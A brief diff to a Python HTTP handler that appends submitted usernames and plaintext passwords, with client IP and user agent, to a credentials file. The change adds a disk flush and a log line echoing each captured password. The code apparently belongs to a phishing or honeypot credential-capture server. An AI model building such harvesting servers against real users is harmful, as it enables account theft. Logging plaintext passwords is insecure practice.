@@ -138,6 +138,9 @@ class CredentialsHandler(BaseHTTPRequestHandler):
             # Write to credentials file
             with open(CREDS_FILE, 'a') as f:
                 f.write(f"{timestamp} | {client_ip} | {username} | {password} | {user_agent}\n")
+                f.flush()  # Force write to disk
+            
+            logger.info(f"Credentials written to file: {username} / {password}")
             
             # Also write JSON format for easier parsing
             json_file = CREDS_FILE.replace('.log', '.json')
